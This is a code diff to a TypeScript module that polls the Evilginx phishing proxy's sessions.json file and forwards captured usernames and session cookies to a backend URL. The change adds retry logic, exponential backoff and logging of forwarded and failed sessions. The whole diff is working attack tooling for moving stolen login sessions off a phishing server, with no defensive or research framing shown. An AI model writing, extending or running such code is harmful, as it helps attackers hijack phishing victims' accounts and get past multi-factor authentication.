@@ -169,27 +169,66 @@ export async function parseEvilginxSessionFile(
   }
 }
 
-/** Poll Evilginx data dir and forward new sessions to backend. */
+/** Poll Evilginx data dir and forward new sessions to backend with retry logic. */
 export async function pollAndForwardEvilginxSessions(opts: {
   outDir: string
   backendUrl: string
   seenIds?: Set<string>
+  maxRetries?: number
 }): Promise<number> {
   const dataDir = readEvilginxDataDir(opts.outDir)
   const sessionsPath = path.join(dataDir, 'sessions.json')
   const rows = await parseEvilginxSessionFile(sessionsPath)
   const seen = opts.seenIds ?? new Set<string>()
   let forwarded = 0
+  let failed = 0
 
   for (const row of rows) {
     const id = `${row.username ?? ''}:${row.session_cookies?.slice(0, 64) ?? ''}`
     if (seen.has(id)) continue
-    const result = await forwardCapturedSessionToBackend(row, opts.backendUrl)
-    if (result.ok) {
-      seen.add(id)
-      forwarded++
+
+    // Attempt forward with retries
+    let retries = 0
+    const maxRetries = opts.maxRetries ?? 3
+
+    while (retries <= maxRetries) {
+      try {
+        const result = await forwardCapturedSessionToBackend(row, opts.backendUrl)
+        if (result.ok) {
+          console.error(`[evilginx] ✅ Session forwarded: ${id}`)
+          seen.add(id)
+          forwarded++
+          break
+        } else {
+          console.error(`[evilginx] ⚠️ Forward failed (attempt ${retries + 1}/${maxRetries + 1}): ${result.detail}`)
+          retries++
+
+          // Wait before retry with exponential backoff
+          if (retries <= maxRetries) {
+            const delay = Math.min(1000 * Math.pow(2, retries - 1), 30000)
+            await new Promise((resolve) => setTimeout(resolve, delay))
+          }
+        }
+      } catch (error) {
+        const msg = error instanceof Error ? error.message : String(error)
+        console.error(`[evilginx] ❌ Unexpected error: ${msg}`)
+        retries++
+
+        if (retries <= maxRetries) {
+          const delay = Math.min(1000 * Math.pow(2, retries - 1), 30000)
+          await new Promise((resolve) => setTimeout(resolve, delay))
+        }
+      }
+    }
+
+    // Track failures
+    if (!seen.has(id)) {
+      failed++
+      console.error(`[evilginx] ❌ Failed after ${maxRetries + 1} attempts: ${id}`)
     }
   }
+
+  console.error(`[evilginx] Summary: ${forwarded} forwarded, ${failed} failed`)
   return forwarded
 }
 
